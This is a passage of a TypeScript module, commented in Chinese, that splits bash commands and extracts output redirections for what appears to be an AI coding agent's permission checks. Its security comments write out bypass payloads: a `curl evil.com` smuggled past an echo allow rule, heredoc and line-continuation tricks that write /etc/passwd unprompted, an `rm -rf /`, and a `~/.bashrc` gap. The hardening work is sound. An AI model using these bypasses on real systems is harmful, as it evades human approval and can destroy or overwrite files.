/**
 * Bash 命令拆分的辅助函数。
 *
 * 摘取范围：安全校验所需的纯函数，不包含依赖 LLM 的
 * `getCommandSubcommandPrefix`（prefix.ts 调 queryHaiku，无法也不应引入）。
 *
 * 摘取的导出：
 *   - splitCommandWithOperators   ：按 shell 运算符拆分（引号/heredoc/续行感知）
 *   - splitCommand_DEPRECATED     ：拆分后剥离重定向，供权限提示展示
 *   - filterControlOperators      ：过滤控制运算符
 *   - isHelpCommand               ：--help 命令判定
 *   - isUnsafeCompoundCommand_DEPRECATED：无法安全证明的复合命令
 *   - extractOutputRedirections   ：提取输出重定向（重定向路径校验的输入）
 *
 * 依赖：crypto（随机盐）、shell-quote（npm）、../ast/heredoc.js、
 *       ./shellQuote.js（quote / tryParseShellCommand）。
 */

import { randomBytes } from 'crypto'
import type { ParseEntry } from 'shell-quote'
import { extractHeredocs, restoreHeredocs } from '../ast/heredoc.js'
import { quote, tryParseShellCommand } from './shellQuote.js'

/**
 * 生成带随机盐的占位符字符串，防止注入攻击。
 * 盐值防止恶意命令包含字面占位符字符串在解析时被替换，造成命令参数注入。
 *
 * 安全：这是防止 `sort __SINGLE_QUOTE__ hello --help __SINGLE_QUOTE__`
 * 这类攻击注入参数的关键。
 */
function generatePlaceholders(): {
  SINGLE_QUOTE: string
  DOUBLE_QUOTE: string
  NEW_LINE: string
  ESCAPED_OPEN_PAREN: string
  ESCAPED_CLOSE_PAREN: string
} {
  // 生成 8 个随机字节的十六进制（16 字符）作为盐
  const salt = randomBytes(8).toString('hex')
  return {
    SINGLE_QUOTE: `__SINGLE_QUOTE_${salt}__`,
    DOUBLE_QUOTE: `__DOUBLE_QUOTE_${salt}__`,
    NEW_LINE: `__NEW_LINE_${salt}__`,
    ESCAPED_OPEN_PAREN: `__ESCAPED_OPEN_PAREN_${salt}__`,
    ESCAPED_CLOSE_PAREN: `__ESCAPED_CLOSE_PAREN_${salt}__`,
  }
}

// 标准输入/输出/错误的文件描述符
// https://en.wikipedia.org/wiki/File_descriptor#Standard_streams
const ALLOWED_FILE_DESCRIPTORS = new Set(['0', '1', '2'])

/**
 * 判断重定向目标是否为可安全剥离的简单静态文件路径。
 * 含动态内容（变量、命令替换、glob、shell 展开）的目标返回 false，
 * 这类目标应保留在权限提示中可见（安全考虑）。
 */
function isStaticRedirectTarget(target: string): boolean {
  // 安全：bash 的静态重定向目标是单个 shell 单词。splitCommandWithOperators
  // 的相邻字符串折叠后，重定向后的多个参数会带空格合并成一个字符串。
  // 对 `cat > out /etc/passwd`，bash 写入 `out` 并读取 `/etc/passwd`，
  // 但折叠给我们 `out /etc/passwd` 作为"目标"。接受这个合并块会返回
  // `['cat']`，pathValidation 永远看不到该路径。
  // 拒绝任何含空白或引号字符的目标（引号表示占位符还原保留了带引号参数）。
  if (/[\s'"]/.test(target)) return false
  // 拒绝空串——path.resolve(cwd, '') 返回 cwd（总是被允许）。
  if (target.length === 0) return false
  // 安全（解析差异加固）：shell-quote 把词首位置的 `#foo` 解析为注释 token。
  // bash 中空白后的 `#` 也开启注释（`> #file` 是语法错误）。但 shell-quote
  // 返回注释对象；splitCommandWithOperators 把它映射回字符串 `#foo`。
  // 这与 extractOutputRedirections（把注释对象视为非字符串、漏掉目标）不同。
  // 虽然 `> #file` 在 bash 不可执行，拒绝 `#` 前缀目标可闭合该差异。
  if (target.startsWith('#')) return false
  return (
    !target.startsWith('!') && // 无历史展开 !!、!-1、!foo
    !target.startsWith('=') && // 无 Zsh 等号展开（=cmd 展开为 /path/to/cmd）
    !target.includes('$') && // 无 $HOME 这类变量
    !target.includes('`') && // 无 `pwd` 这类命令替换
    !target.includes('*') && // 无 glob 模式
    !target.includes('?') && // 无单字符 glob
    !target.includes('[') && // 无字符类 glob
    !target.includes('{') && // 无 {1,2} 花括号展开
    !target.includes('~') && // 无波浪号展开
    !target.includes('(') && // 无 >(cmd) 进程替换
    !target.includes('<') && // 无 <(cmd) 进程替换
    !target.startsWith('&') // 非 &1 这类文件描述符
  )
}

export function splitCommandWithOperators(command: string): string[] {
  const parts: (ParseEntry | null)[] = []

  // 为本次解析生成唯一占位符，防止注入攻击
  // 安全：随机盐防止恶意命令包含字面占位符字符串在解析时被替换
  const placeholders = generatePlaceholders()

  // 解析前先提取 heredoc——shell-quote 错误解析 <<
  const { processedCommand, heredocs } = extractHeredocs(command)

  // 连接续行：反斜杠+换行会移除两个字符
  // 必须在换行分词前做，把续行视为单条命令
  // 安全：绝不能在这里加空格——shell 直接连接 token 不加空格。
  // 加空格会允许绕过攻击，如 `tr\<newline>aceroute` 被解析为
  // `tr aceroute`（两个 token），而 shell 执行 `traceroute`（一个 token）。
  // 安全：只有换行前反斜杠为奇数时才连接。
  // 偶数个（如 `\\<newline>`）时反斜杠两两配对成转义序列，换行是命令
  // 分隔符而非续行。连接会漏检后续命令（如 `echo \\<newline>rm -rf /`
  // 会被解析成一条命令但 shell 执行两条）。
  const commandWithContinuationsJoined = processedCommand.replace(
    /\\+\n/g,
    match => {
      const backslashCount = match.length - 1 // -1 为换行
      if (backslashCount % 2 === 1) {
        // 奇数个反斜杠：最后一个转义换行（续行）
        // 移除转义反斜杠与换行，保留其余反斜杠
        return '\\'.repeat(backslashCount - 1)
      } else {
        // 偶数个反斜杠：全部两两配对为转义序列
        // 换行是命令分隔符而非续行——保留
        return match
      }
    },
  )

  // 安全：也对原始命令（heredoc 提取前）做续行连接，供解析失败回退路径使用。
  // 回退路径返回单元素数组，下游权限检查把它当作一条子命令处理。若返回
  // 原文（连接前），校验器检查 `foo\<NL>bar` 而 bash 执行 `foobar`（已连接）。
  // 利用：`echo "$\<NL>{}" ; curl evil.com` — 连接前 `$` 和 `{}` 分处两行，
  // 所以 `${}` 不是危险模式；`;` 可见但整体是一条匹配 Bash(echo:*) 的子命令。
  // 连接后 zsh/bash 执行 `echo "${}" ; curl evil.com` → curl 运行。
  // 在原始命令（而非 processedCommand）上连接，回退路径不必处理 heredoc 占位符。
  const commandOriginalJoined = command.replace(/\\+\n/g, match => {
    const backslashCount = match.length - 1
    if (backslashCount % 2 === 1) {
      return '\\'.repeat(backslashCount - 1)
    }
    return match
  })

  // 尝试解析命令以检测畸形语法
  const parseResult = tryParseShellCommand(
    commandWithContinuationsJoined
      .replaceAll('"', `"${placeholders.DOUBLE_QUOTE}`) // parse() 会剥离引号 :P
      .replaceAll("'", `'${placeholders.SINGLE_QUOTE}`) // parse() 会剥离引号 :P
      .replaceAll('\n', `\n${placeholders.NEW_LINE}\n`) // parse() 会剥离换行 :P
      .replaceAll('\\(', placeholders.ESCAPED_OPEN_PAREN) // parse() 把 \( 转成 ( :P
      .replaceAll('\\)', placeholders.ESCAPED_CLOSE_PAREN), // parse() 把 \) 转成 ) :P
    varName => `$${varName}`, // 保留 shell 变量
  )

  // 若解析因畸形语法失败（如 shell-quote 对 ${var + expr} 抛
  // "Bad substitution"），把整条命令当作单个字符串。这与下方 catch 块
  // 一致，避免中断——命令仍会走权限检查。
  if (!parseResult.success) {
    // 安全：返回续行连接后的原文，而非未连接原文。
    // 理由见上方 commandOriginalJoined 定义的利用分析。
    return [commandOriginalJoined]
  }

  const parsed = parseResult.tokens

  // 若解析返回空数组（空命令）
  if (parsed.length === 0) {
    // 特例：空串或纯空白串返回空数组
    return []
  }

  try {
    // 1. 折叠相邻字符串与 glob
    for (const part of parsed) {
      if (typeof part === 'string') {
        if (parts.length > 0 && typeof parts[parts.length - 1] === 'string') {
          if (part === placeholders.NEW_LINE) {
            // 若该部分是 NEW_LINE，结束前一个字符串并开始新命令
            parts.push(null)
          } else {
            parts[parts.length - 1] += ' ' + part
          }
          continue
        }
      } else if ('op' in part && part.op === 'glob') {
        // 若前一部分是字符串（非运算符），把 glob 与它折叠
        if (parts.length > 0 && typeof parts[parts.length - 1] === 'string') {
          parts[parts.length - 1] += ' ' + part.pattern
          continue
        }
      }
      parts.push(part)
    }

    // 2. 把 token 映射为字符串
    const stringParts = parts
      .map(part => {
        if (part === null) {
          return null
        }
        if (typeof part === 'string') {
          return part
        }
        if ('comment' in part) {
          // shell-quote 原样保留注释文本，包括我们第 0 步注入的
          // `"PLACEHOLDER` / `'PLACEHOLDER` 标记。由于原引号未被剥离
          // （注释是字面量），下面的去占位符步骤会把每个引号翻倍
          // （`"` → `""`）。递归 splitCommand 调用时这指数增长，直到
          // shell-quote 的分块正则灾难性回溯（ReDoS）。
          // 剥离注入的引号前缀，使去占位符只产生一个引号。
          const cleaned = part.comment
            .replaceAll(
              `"${placeholders.DOUBLE_QUOTE}`,
              placeholders.DOUBLE_QUOTE,
            )
            .replaceAll(
              `'${placeholders.SINGLE_QUOTE}`,
              placeholders.SINGLE_QUOTE,
            )
          return '#' + cleaned
        }
        if ('op' in part && part.op === 'glob') {
          return part.pattern
        }
        if ('op' in part) {
          return part.op
        }
        return null
      })
      .filter(_ => _ !== null)

    // 3. 把引号与转义圆括号映射回原始形式
    const quotedParts = stringParts.map(part => {
      return part
        .replaceAll(`${placeholders.SINGLE_QUOTE}`, "'")
        .replaceAll(`${placeholders.DOUBLE_QUOTE}`, '"')
        .replaceAll(`\n${placeholders.NEW_LINE}\n`, '\n')
        .replaceAll(placeholders.ESCAPED_OPEN_PAREN, '\\(')
        .replaceAll(placeholders.ESCAPED_CLOSE_PAREN, '\\)')
    })

    // 还原解析前提取的 heredoc
    return restoreHeredocs(quotedParts, heredocs)
  } catch (_error) {
    // 若 shell-quote 解析失败（如畸形的变量替换），
    // 把整条命令当作单个字符串避免崩溃
    // 安全：返回续行连接后的原文（理由同上）。
    return [commandOriginalJoined]
  }
}

export function filterControlOperators(
  commandsAndOperators: string[],
): string[] {
  return commandsAndOperators.filter(
    part => !ALL_SUPPORTED_CONTROL_OPERATORS.has(part),
  )
}

/**
 * @deprecated Legacy 正则/shell-quote 路径。仅在 tree-sitter 不可用时使用。
 * 主闸门是 parseForSecurity（ast.ts）。
 *
 * 按 shell 运算符把命令字符串拆分为单条命令。
 */
export function splitCommand_DEPRECATED(command: string): string[] {
  const parts: (string | undefined)[] = splitCommandWithOperators(command)
  // 处理标准输入/输出/错误重定向
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i]
    if (part === undefined) {
      continue
    }

    // 剥离重定向，使其不作为权限提示中的独立命令出现。
    // 处理：2>&1, 2>/dev/null, > file.txt, >> file.txt
    // 文件目标的安全校验由 checkPathConstraints() 单独完成
    if (part === '>&' || part === '>' || part === '>>') {
      const prevPart = parts[i - 1]?.trim()
      const nextPart = parts[i + 1]?.trim()
      const afterNextPart = parts[i + 2]?.trim()
      if (nextPart === undefined) {
        continue
      }

      // 判断是否剥离该重定向
      let shouldStrip = false
      let stripThirdToken = false

      // 特例：相邻字符串折叠把 `/dev/null` 和 `2` 合并成
      // `/dev/null 2`（对 `> /dev/null 2>&1`）。尾部的 ` 2` 是下一个
      // 重定向（`>&1`）的 FD 前缀。检测：nextPart 以 ` <FD>` 结尾且
      // afterNextPart 是重定向运算符。切掉 FD 后缀让 isStaticRedirectTarget
      // 只看到实际目标。FD 后缀丢弃无害——循环到达 `>&` 时会处理它。
      let effectiveNextPart = nextPart
      if (
        (part === '>' || part === '>>') &&
        nextPart.length >= 3 &&
        nextPart.charAt(nextPart.length - 2) === ' ' &&
        ALLOWED_FILE_DESCRIPTORS.has(nextPart.charAt(nextPart.length - 1)) &&
        (afterNextPart === '>' ||
          afterNextPart === '>>' ||
          afterNextPart === '>&')
      ) {
        effectiveNextPart = nextPart.slice(0, -2)
      }

      if (part === '>&' && ALLOWED_FILE_DESCRIPTORS.has(nextPart)) {
        // 2>&1 风格（>& 后无空格）
        shouldStrip = true
      } else if (
        part === '>' &&
        nextPart === '&' &&
        afterNextPart !== undefined &&
        ALLOWED_FILE_DESCRIPTORS.has(afterNextPart)
      ) {
        // 2 > &1 风格（处处有空格）
        shouldStrip = true
        stripThirdToken = true
      } else if (
        part === '>' &&
        nextPart.startsWith('&') &&
        nextPart.length > 1 &&
        ALLOWED_FILE_DESCRIPTORS.has(nextPart.slice(1))
      ) {
        // 2 > &1 风格（&1 前有空格但 &1 后无）
        shouldStrip = true
      } else if (
        (part === '>' || part === '>>') &&
        isStaticRedirectTarget(effectiveNextPart)
      ) {
        // 一般文件重定向：> file.txt, >> file.txt, > /tmp/output.txt
        // 只剥离静态目标；含 $、`、* 等的动态目标保持可见
        shouldStrip = true
      }

      if (shouldStrip) {
        // 若前一部分尾部有文件描述符则移除
        // （如对 `echo foo 2>file` 剥离 'echo foo 2' 中的 '2'）。
        //
        // 安全：只有当数字前是空格且剥离后非空时才剥离。shell-quote
        // 无法区分 `2>`（FD 重定向）与 `2 >`（参数 + stdout）。无空格
        // 检查时 `cat /tmp/path2 > out` 会被截断成 `cat /tmp/path`。
        // 无长度检查时 `echo ; 2 > file` 会抹掉 `2` 子命令。
        if (
          prevPart &&
          prevPart.length >= 3 &&
          ALLOWED_FILE_DESCRIPTORS.has(prevPart.charAt(prevPart.length - 1)) &&
          prevPart.charAt(prevPart.length - 2) === ' '
        ) {
          parts[i - 1] = prevPart.slice(0, -2)
        }

        // 移除重定向运算符与目标
        parts[i] = undefined
        parts[i + 1] = undefined
        if (stripThirdToken) {
          parts[i + 2] = undefined
        }
      }
    }
  }
  // 移除 undefined 部分与空串（来自被剥离的文件描述符）
  const stringParts = parts.filter(
    (part): part is string => part !== undefined && part !== '',
  )
  return filterControlOperators(stringParts)
}

const COMMAND_LIST_SEPARATORS = new Set<string>([
  '&&',
  '||',
  ';',
  ';;',
  '|',
])

const ALL_SUPPORTED_CONTROL_OPERATORS = new Set<string>([
  ...COMMAND_LIST_SEPARATORS,
  '>&',
  '>',
  '>>',
])

// 检查是否只是命令列表
function isCommandList(command: string): boolean {
  // 生成唯一占位符防止注入攻击
  const placeholders = generatePlaceholders()

  // 解析前提取 heredoc——shell-quote 错误解析 <<
  const { processedCommand } = extractHeredocs(command)

  const parseResult = tryParseShellCommand(
    processedCommand
      .replaceAll('"', `"${placeholders.DOUBLE_QUOTE}`) // parse() 会剥离引号 :P
      .replaceAll("'", `'${placeholders.SINGLE_QUOTE}`), // parse() 会剥离引号 :P
    varName => `$${varName}`, // 保留 shell 变量
  )

  // 解析失败则不是安全命令列表
  if (!parseResult.success) {
    return false
  }

  const parts = parseResult.tokens
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i]
    const nextPart = parts[i + 1]
    if (part === undefined) {
      continue
    }

    if (typeof part === 'string') {
      // 字符串安全
      continue
    }
    if ('comment' in part) {
      // 不信任注释，它们可含命令注入
      return false
    }
    if ('op' in part) {
      if (part.op === 'glob') {
        // glob 安全
        continue
      } else if (COMMAND_LIST_SEPARATORS.has(part.op)) {
        // 命令列表分隔符安全
        continue
      } else if (part.op === '>&') {
        // 重定向到标准输入/输出/错误文件描述符安全
        if (
          nextPart !== undefined &&
          typeof nextPart === 'string' &&
          ALLOWED_FILE_DESCRIPTORS.has(nextPart.trim())
        ) {
          continue
        }
      } else if (part.op === '>') {
        // 输出重定向由 pathValidation.ts 校验
        continue
      } else if (part.op === '>>') {
        // 追加重定向由 pathValidation.ts 校验
        continue
      }
      // 其他运算符不安全
      return false
    }
  }
  // 整条命令未发现不安全运算符
  return true
}

/**
 * @deprecated Legacy 正则/shell-quote 路径。仅在 tree-sitter 不可用时使用。
 * 主闸门是 parseForSecurity（ast.ts）。
 */
export function isUnsafeCompoundCommand_DEPRECATED(command: string): boolean {
  // 纵深防御：若 shell-quote 完全无法解析命令，视为不安全，总是询问用户。
  // 即使 bash 很可能也会拒绝畸形语法，我们不想在安全上依赖该假设。
  const { processedCommand } = extractHeredocs(command)
  const parseResult = tryParseShellCommand(
    processedCommand,
    varName => `$${varName}`,
  )
  if (!parseResult.success) {
    return true
  }

  return splitCommand_DEPRECATED(command).length > 1 && !isCommandList(command)
}

/**
 * 从命令中提取输出重定向（若存在）。
 * 只处理简单字符串目标（不含变量或命令替换）。
 *
 * @returns 含去除重定向的命令与找到的目标路径的对象
 */
export function extractOutputRedirections(cmd: string): {
  commandWithoutRedirections: string
  redirections: Array<{ target: string; operator: '>' | '>>' }>
  hasDangerousRedirection: boolean
} {
  const redirections: Array<{ target: string; operator: '>' | '>>' }> = []
  let hasDangerousRedirection = false

  // 安全：在续行连接与解析之前提取 heredoc。
  // 与 splitCommandWithOperators（line 101）一致。带引号的 heredoc 正文
  // 在 bash 是字面文本（`<< 'EOF'\n${}\nEOF` — ${} 不展开，`\<newline>` 
  // 不是续行）。但 shell-quote 不理解 heredoc；它把第 2 行的 `${}` 当
  // 不带引号的坏替换并抛错。
  //
  // 顺序关键：若先连接续行，含 `x\<newline>DELIM` 的带引号 heredoc 正文
  // 会被连接成 `xDELIM`——定界符移位，bash 实际执行的 `> /etc/passwd`
  // 被吞进 heredoc 正文，永远到不了路径校验。
  //
  // 攻击：`cat <<'ls'\nx\\\nls\n> /etc/passwd\nls` 配 Bash(cat:*)
  //   - bash：带引号 heredoc → `\` 是字面量，正文 = `x\`，下一个 `ls`
  //     关闭 heredoc → `> /etc/passwd` 截断文件，最后的 `ls` 运行
  //   - 先连接（旧、错）：`x\<NL>ls` → `xls`，定界符搜索找到最后一个
  //     `ls`，正文 = `xls\n> /etc/passwd` → redirections:[] →
  //     /etc/passwd 永不被校验 → 文件写入，无提示
  //   - 先提取（新，与 splitCommandWithOperators 一致）：正文 = `x\`，
  //     `> /etc/passwd` 幸存 → 被捕获 → 路径校验
  //
  // 原始攻击（先提取后解析存在的缘由）：
  //   `echo payload << 'EOF' > /etc/passwd\n${}\nEOF` 配 Bash(echo:*)
  //   - bash：带引号 heredoc → ${} 字面量，echo 把 "payload\n" 写入
  //     /etc/passwd
  //   - checkPathConstraints：对原文调用本函数 → ${} 使 shell-quote
  //     崩溃 → 旧实现返回 {redirections:[], dangerous:false}
  //     → /etc/passwd 永不被校验 → 文件写入，无提示。
  const { processedCommand: heredocExtracted, heredocs } = extractHeredocs(cmd)

  // 安全：heredoc 提取后、解析前连接续行。没有它，`> \<newline>/etc/passwd`
  // 会让 shell-quote 对 `\<newline>` 发出空串 token，对真实路径发独立
  // token。提取器把 `''` 当目标；isSimpleTarget('') 原先是空真（现已修复
  // 作纵深防御）；path.resolve(cwd,'') 返回 cwd（总是允许）。而 bash 连接
  // 续行后写入 /etc/passwd。注意偶数反斜杠时换行是分隔符（非续行）。
  const processedCommand = heredocExtracted.replace(/\\+\n/g, match => {
    const backslashCount = match.length - 1
    if (backslashCount % 2 === 1) {
      return '\\'.repeat(backslashCount - 1)
    }
    return match
  })

  // 尝试解析 heredoc 提取后的命令
  const parseResult = tryParseShellCommand(processedCommand, env => `$${env}`)

  // 安全：解析失败时 FAIL-CLOSED。旧实现返回
  // {redirections:[], hasDangerousRedirection:false}——静默绕过。
  // 若 shell-quote 无法解析（即使 heredoc 提取后），我们无法验证存在
  // 哪些重定向。命令中的任何 `>` 都可能写文件。
  // 调用方必须视为危险并询问用户。
  if (!parseResult.success) {
    return {
      commandWithoutRedirections: cmd,
      redirections: [],
      hasDangerousRedirection: true,
    }
  }

  const parsed = parseResult.tokens

  // 找被重定向的子 shell（如 "(cmd) > file"）
  const redirectedSubshells = new Set<number>()
  const parenStack: Array<{ index: number; isStart: boolean }> = []

  parsed.forEach((part, i) => {
    if (isOperator(part, '(')) {
      const prev = parsed[i - 1]
      const isStart =
        i === 0 ||
        (prev &&
          typeof prev === 'object' &&
          'op' in prev &&
          ['&&', '||', ';', '|'].includes(prev.op))
      parenStack.push({ index: i, isStart: !!isStart })
    } else if (isOperator(part, ')') && parenStack.length > 0) {
      const opening = parenStack.pop()!
      const next = parsed[i + 1]
      if (
        opening.isStart &&
        (isOperator(next, '>') || isOperator(next, '>>'))
      ) {
        redirectedSubshells.add(opening.index).add(i)
      }
    }
  })

  // 处理命令并提取重定向
  const kept: ParseEntry[] = []
  let cmdSubDepth = 0

  for (let i = 0; i < parsed.length; i++) {
    const part = parsed[i]
    if (!part) continue

    const [prev, next] = [parsed[i - 1], parsed[i + 1]]

    // 跳过被重定向的子 shell 括号
    if (
      (isOperator(part, '(') || isOperator(part, ')')) &&
      redirectedSubshells.has(i)
    ) {
      continue
    }

    // 跟踪命令替换深度
    if (
      isOperator(part, '(') &&
      prev &&
      typeof prev === 'string' &&
      prev.endsWith('$')
    ) {
      cmdSubDepth++
    } else if (isOperator(part, ')') && cmdSubDepth > 0) {
      cmdSubDepth--
    }

    // 提取命令替换之外的重定向
    if (cmdSubDepth === 0) {
      const { skip, dangerous } = handleRedirection(
        part,
        prev,
        next,
        parsed[i + 2],
        parsed[i + 3],
        redirections,
        kept,
      )
      if (dangerous) {
        hasDangerousRedirection = true
      }
      if (skip > 0) {
        i += skip
        continue
      }
    }

    kept.push(part)
  }

  return {
    commandWithoutRedirections: restoreHeredocs(
      [reconstructCommand(kept, processedCommand)],
      heredocs,
    )[0]!,
    redirections,
    hasDangerousRedirection,
  }
}

function isOperator(part: ParseEntry | undefined, op: string): boolean {
  return (
    typeof part === 'object' && part !== null && 'op' in part && part.op === op
  )
}

function isSimpleTarget(target: ParseEntry | undefined): target is string {
  // 安全：拒绝空串。isSimpleTarget('') 空真地通过下面每个字符类检查；
  // path.resolve(cwd,'') 返回 cwd（总是在允许根内）。空目标可能来自
  // shell-quote 对 `\<newline>` 发出的 ''。bash 中 `> \<newline>/etc/passwd`
  // 连接续行并写入 /etc/passwd。与 extractOutputRedirections 中的续行
  // 连接修复一起构成纵深防御。
  if (typeof target !== 'string' || target.length === 0) return false
  return (
    !target.startsWith('!') && // 历史展开模式 !!, !-1, !foo
    !target.startsWith('=') && // Zsh 等号展开（=cmd 展开为 /path/to/cmd）
    !target.startsWith('~') && // 波浪号展开（~, ~/path, ~user/path）
    !target.includes('$') && // 变量/命令替换
    !target.includes('`') && // 反引号命令替换
    !target.includes('*') && // glob 通配
    !target.includes('?') && // glob 单字符
    !target.includes('[') && // glob 字符类
    !target.includes('{') // 花括号展开 {a,b} 或 {1..5}
  )
}

/**
 * 检查重定向目标是否含可绕过路径校验的 shell 展开语法。
 * 出于安全这些需要人工批准。
 *
 * 设计不变量：对每个字符串重定向目标，要么 isSimpleTarget 为 TRUE
 * （→ 被捕获 → 路径校验），要么 hasDangerousExpansion 为 TRUE
 * （→ 标记危险 → 询问）。两者都失败的目标会落到 {skip:0, dangerous:false}
 * 且永不被校验。为维持不变量，hasDangerousExpansion 必须覆盖 isSimpleTarget
 * 拒绝的每个情况（空串单独处理除外）。
 */
function hasDangerousExpansion(target: ParseEntry | undefined): boolean {
  // shell-quote 把不带引号的 glob 解析为 {op:'glob', pattern:'...'} 对象，
  // 而非字符串。`> *.sh` 作为重定向目标在运行时展开（单匹配 → 覆盖，
  // 多匹配 → 歧义重定向错误）。标记为危险。
  if (typeof target === 'object' && target !== null && 'op' in target) {
    if (target.op === 'glob') return true
    return false
  }
  if (typeof target !== 'string') return false
  if (target.length === 0) return false
  return (
    target.includes('$') ||
    target.includes('%') ||
    target.includes('`') || // 反引号替换（原先只在 isSimpleTarget）
    target.includes('*') || // glob（原先只在 isSimpleTarget）
    target.includes('?') || // glob（原先只在 isSimpleTarget）
    target.includes('[') || // glob 类（原先只在 isSimpleTarget）
    target.includes('{') || // 花括号展开（原先只在 isSimpleTarget）
    target.startsWith('!') || // 历史展开（原先只在 isSimpleTarget）
    target.startsWith('=') || // Zsh 等号展开（=cmd -> /path/to/cmd）
    // 所有波浪号前缀目标。旧实现用注释声称 "~ 与 ~/path 由 expandTilde
    // 处理" 而把 ~ 与 ~/path 排除——但 expandTilde 只通过
    // validateOutputRedirections(redirections) 运行，且对 `~/path`，
    // redirections 数组是空的（isSimpleTarget 拒绝了它，从未被 push）。
    // 该排除制造了 `> ~/.bashrc` 既不被捕获也不被标记的空隙。
    // 见 bug_007 / bug_022。
    target.startsWith('~')
  )
}

function handleRedirection(
  part: ParseEntry,
  prev: ParseEntry | undefined,
  next: ParseEntry | undefined,
  nextNext: ParseEntry | undefined,
  nextNextNext: ParseEntry | undefined,
  redirections: Array<{ target: string; operator: '>' | '>>' }>,
  kept: ParseEntry[],
): { skip: number; dangerous: boolean } {
  const isFileDescriptor = (p: ParseEntry | undefined): p is string =>
    typeof p === 'string' && /^\d+$/.test(p.trim())

  // 处理 > 与 >> 运算符
  if (isOperator(part, '>') || isOperator(part, '>>')) {
    const operator = (part as { op: '>' | '>>' }).op

    // 文件描述符重定向（2>, 3>, 等）
    if (isFileDescriptor(prev)) {
      // 检查 ZSH 强制覆盖语法（2>! file, 2>>! file）
      if (next === '!' && isSimpleTarget(nextNext)) {
        return handleFileDescriptorRedirection(
          prev.trim(),
          operator,
          nextNext, // 跳过 "!" 用实际目标
          redirections,
          kept,
          2, // 同时跳过 "!" 与目标
        )
      }
      // 2>! 带危险展开目标
      if (next === '!' && hasDangerousExpansion(nextNext)) {
        return { skip: 0, dangerous: true }
      }
      // 检查 POSIX 强制覆盖语法（2>| file, 2>>| file）
      if (isOperator(next, '|') && isSimpleTarget(nextNext)) {
        return handleFileDescriptorRedirection(
          prev.trim(),
          operator,
          nextNext, // 跳过 "|" 用实际目标
          redirections,
          kept,
          2, // 同时跳过 "|" 与目标
        )
      }
      // 2>| 带危险展开目标
      if (isOperator(next, '|') && hasDangerousExpansion(nextNext)) {
        return { skip: 0, dangerous: true }
      }
      // 2>!filename（无空格）——shell-quote 解析为 2 > "!filename"。
      // Zsh 中 2>! 是强制覆盖且剩余部分会展开，例如 2>!=rg 展开为
      // 2>! /usr/bin/rg，2>!~root/.bashrc 展开为 2>! /var/root/.bashrc。
      // 必须剥离 ! 并检查剩余部分的危险展开。与下方非 FD 处理器一致。
      // 排除历史展开模式（!!, !-n, !?, !digit）。
      if (
        typeof next === 'string' &&
        next.startsWith('!') &&
        next.length > 1 &&
        next[1] !== '!' && // !!
        next[1] !== '-' && // !-n
        next[1] !== '?' && // !?string
        !/^!\d/.test(next) // !n (digit)
      ) {
        const afterBang = next.substring(1)
        // 安全：检查 zsh 解释的目标（! 之后）中的展开
        if (hasDangerousExpansion(afterBang)) {
          return { skip: 0, dangerous: true }
        }
        // ! 之后的安全目标——捕获 zsh 解释的目标（不含 !）供路径校验。
        // zsh 中 2>!output.txt 写入 output.txt（而非 !output.txt），
        // 所以校验那个路径。
        return handleFileDescriptorRedirection(
          prev.trim(),
          operator,
          afterBang,
          redirections,
          kept,
          1,
        )
      }
      return handleFileDescriptorRedirection(
        prev.trim(),
        operator,
        next,
        redirections,
        kept,
        1, // 只跳过目标
      )
    }

    // >| 强制覆盖（解析为 > 后跟 |）
    if (isOperator(next, '|') && isSimpleTarget(nextNext)) {
      redirections.push({ target: nextNext as string, operator })
      return { skip: 2, dangerous: false }
    }
    // >| 带危险展开目标
    if (isOperator(next, '|') && hasDangerousExpansion(nextNext)) {
      return { skip: 0, dangerous: true }
    }

    // >! ZSH 强制覆盖（解析为 > 后跟 "!"）
    // ZSH 中即使设置 noclobber，>! 也强制覆盖
    if (next === '!' && isSimpleTarget(nextNext)) {
      redirections.push({ target: nextNext as string, operator })
      return { skip: 2, dangerous: false }
    }
    // >! 带危险展开目标
    if (next === '!' && hasDangerousExpansion(nextNext)) {
      return { skip: 0, dangerous: true }
    }

    // >!filename（无空格）——shell-quote 解析为 > 后跟 "!filename"
    // 这在当前目录创建名为 "!filename" 的文件
    // 捕获它供路径校验（! 成为文件名的一部分）
    // 但必须排除历史展开模式 !!、!-1、!n、!?string
    // 历史模式以：!! 或 !- 或 !digit 或 !? 开头
    if (
      typeof next === 'string' &&
      next.startsWith('!') &&
      next.length > 1 &&
      // 排除历史展开模式
      next[1] !== '!' && // !!
      next[1] !== '-' && // !-n
      next[1] !== '?' && // !?string
      !/^!\d/.test(next) // !n (digit)
    ) {
      // 安全：检查 ! 之后部分的危险展开
      // Zsh 中 >! 是强制覆盖且剩余部分会展开
      // 例如 >!=rg 展开为 >! /usr/bin/rg，>!~root/.bashrc 展开为 >! /root/.bashrc
      const afterBang = next.substring(1)
      if (hasDangerousExpansion(afterBang)) {
        return { skip: 0, dangerous: true }
      }
      // 安全：push afterBang（不含 `!`），而非 next（含 `!`）。
      // 若 zsh 把 `>!filename` 解释为强制覆盖，目标是 `filename`
      // （而非 `!filename`）。push `!filename` 会让 path.resolve
      // 把它当相对路径（cwd/!filename），绕过绝对路径校验。
      // 对 `>!/etc/passwd`，我们会校验 `cwd/!/etc/passwd`（在允许根内）
      // 而 zsh 写入 `/etc/passwd`（绝对）。此处剥离 `!` 与上方 FD 处理器
      // 一致，且两种解释下都更安全：zsh 强制覆盖时我们校验正确路径；
      // zsh 把 `!` 当字面量时我们校验更严格的绝对路径（fail-closed 而非
      // 静默放行 cwd 相对路径）。
      redirections.push({ target: afterBang, operator })
      return { skip: 1, dangerous: false }
    }

    // >>&! 与 >>&| —— 合并 stdout/stderr 并强制（解析为 >> & ! 或 >> & |）
    // 这些是 ZSH/bash 对 stdout 与 stderr 强制追加的运算符
    if (isOperator(next, '&')) {
      // >>&! 模式
      if (nextNext === '!' && isSimpleTarget(nextNextNext)) {
        redirections.push({ target: nextNextNext as string, operator })
        return { skip: 3, dangerous: false }
      }
      // >>&! 带危险展开目标
      if (nextNext === '!' && hasDangerousExpansion(nextNextNext)) {
        return { skip: 0, dangerous: true }
      }
      // >>&| 模式
      if (isOperator(nextNext, '|') && isSimpleTarget(nextNextNext)) {
        redirections.push({ target: nextNextNext as string, operator })
        return { skip: 3, dangerous: false }
      }
      // >>&| 带危险展开目标
      if (isOperator(nextNext, '|') && hasDangerousExpansion(nextNextNext)) {
        return { skip: 0, dangerous: true }
      }
      // >>& 模式（无强制修饰符的普通合并追加）
      if (isSimpleTarget(nextNext)) {
        redirections.push({ target: nextNext as string, operator })
